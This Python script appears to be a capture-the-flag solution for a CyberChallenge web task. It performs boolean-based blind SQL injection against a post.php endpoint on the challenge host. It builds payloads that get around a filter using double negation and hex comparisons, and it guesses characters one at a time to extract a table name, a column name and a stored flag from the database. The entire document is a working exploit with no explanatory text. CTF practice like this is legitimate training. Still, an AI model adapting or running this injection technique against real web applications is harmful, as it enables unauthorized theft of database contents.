import requests
from time import time

host = 'http://filtered.challs.cyberchallenge.it'
page = '/post.php'
payload_schema = '?id=5\' or {} -- ;'

dictionary = '0123456789abcdef'
result = ''

# Get a table name.
#while True:
while False:
    for c in dictionary:
        payload = f"exists(select 1 from information_schema.tables where not(not(hex(table_name) like '{result+c}%') or not (table_schema=database())))"
        x = requests.get(host + page + payload_schema.format(payload))
        if 'Article not found' not in x.text:
            result = result + c
            print(result)
            break

    else:
        break

print(bytes.fromhex(result).decode("ASCII"))

# Get a column name.
while False:
    table_name = 'flaggy'
    for c in dictionary:
        payload = f"exists(select 1 from information_schema.columns where not(not(hex(column_name) like '{result+c}%') or not (table_name='{table_name}')))"
        x = requests.get(host + page + payload_schema.format(payload))
        if 'Article not found' not in x.text:
            result = result + c
            print(result)
            break

    else:
        break

print(bytes.fromhex(result).decode("ASCII"))

# Get field value.
while True:
    table_name = 'flaggy'
    column_name = 'now'
    for c in dictionary:
        payload = f"exists(select 1 from {table_name} where hex({column_name}) like '{result+c}%')"
        # print(host+page+payload_schema.format(payload))
        x = requests.get(host + page + payload_schema.format(payload))
        if 'Article not found' not in x.text:
            result = result + c
            print(result)
            break

    else:
        break

print(bytes.fromhex(result).decode("ASCII"))

